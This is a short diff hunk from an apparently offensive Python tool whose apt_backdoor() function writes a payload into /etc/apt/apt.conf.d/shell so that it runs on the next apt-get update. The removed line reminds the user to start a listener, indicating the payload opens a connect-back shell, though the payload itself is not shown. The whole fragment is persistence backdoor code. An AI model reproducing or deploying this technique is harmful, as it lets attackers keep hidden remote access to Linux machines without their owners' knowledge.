@@ -9,7 +9,6 @@ def apt_backdoor():
 	if os.path.isdir('/etc/apt/apt.conf.d'):
 		with open('/etc/apt/apt.conf.d/shell', 'w') as apt:
 			print('[+] Writing backdoor to /etc/apt/apt.conf.d/shell')
-			print('[*] Make sure you set up your listener. Once the apt-get update is run it will connect back')
 			apt.write(payload)
 	else:
 		print('Could not find /etc/apt/apt.conf.d')
